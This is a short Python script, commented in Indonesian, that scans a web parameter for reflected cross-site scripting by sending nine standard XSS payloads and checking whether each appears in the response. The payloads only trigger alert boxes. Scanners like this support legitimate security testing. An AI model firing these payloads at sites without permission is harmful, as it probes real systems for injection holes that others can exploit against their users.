import requests

def test_xss(url, param, payloads):
    for payload in payloads:
        # Membuat URL atau data dengan payload XSS
        target_url = f"{url}?{param}={payload}"
        
        try:
            # Mengirim request GET ke server
            response = requests.get(target_url)
            
            # Memeriksa apakah payload muncul di respons
            if payload in response.text:
                print(f"[!] Potensi XSS ditemukan dengan payload: {payload}")
                print(f"    URL: {target_url}")
            else:
                print(f"[*] Payload {payload} tidak ter-refleksi dalam respons.")
        
        except requests.exceptions.RequestException as e:
            print(f"[!] Error saat mengirim request: {e}")

if __name__ == "__main__":
    # URL dan parameter yang akan diuji
    url = ""
    param = "query"
    
    # Daftar payload XSS
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<a href=javascript:alert('XSS')>Click Me</a>",
        "<div onmouseover=alert('XSS')>Hover Me</div>"
    ]
    
    # Memulai pengujian XSS
    print(f"[*] Memulai pengujian XSS pada {url} dengan parameter {param}")
    test_xss(url, param, payloads)